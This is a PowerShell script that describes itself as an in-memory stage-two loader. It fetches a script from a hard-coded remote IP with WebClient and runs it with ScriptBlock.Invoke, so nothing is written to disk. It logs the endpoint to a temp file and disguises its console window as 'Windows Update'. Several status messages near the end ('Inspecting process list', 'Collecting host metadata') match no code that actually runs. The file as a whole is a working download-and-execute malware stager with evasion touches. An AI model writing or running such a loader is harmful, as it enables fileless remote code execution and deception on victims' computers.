
<#
.SYNOPSIS
    Endpoint-driven in-memory script loader.

.DESCRIPTION
    Resolves the configured endpoint, downloads the stage 2 text
    with a bounded timeout, checks the returned length and then
    executes the script block in the current session.

.NOTES
    No script content is written to disk.
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://203.0.113.53:8080/stage2.ps1',
    [string]$TracePath = "$env:TEMP\report.txt",
    [int]$RequestTimeout = 93
)
$ErrorActionPreference = "Stop"

# Text retrieval
function Get-StageScriptText {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 93
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

# In-memory execution
function Invoke-Stage2Script {
    [CmdletBinding()]
    param(
        [string]$ScriptBody = ''
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

Write-Verbose "Starting in-memory stage"
$RemoteScript = Get-StageScriptText -SourceUrl $TransferUrl -TimeoutSec $RequestTimeout
$TransferResult = Invoke-Stage2Script -ScriptBody $RemoteScript
Write-Verbose "Stage result: $($TransferResult)"

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $TransferUrl
    ScriptLength = $RemoteScript.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Reading configuration values"
Write-Verbose "Exporting operation report"
Write-Verbose "Collecting host metadata"
Write-Verbose "Starting workflow"
Write-Verbose "Stage handoff finished"
Write-Verbose "Applying operation timeout"
Write-Verbose "Inspecting process list"
Write-Verbose "Checking local path"
Write-Verbose "Resolving configured target"
Write-Verbose "Operation completed"
$Host.UI.RawUI.WindowTitle = "Windows Update"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
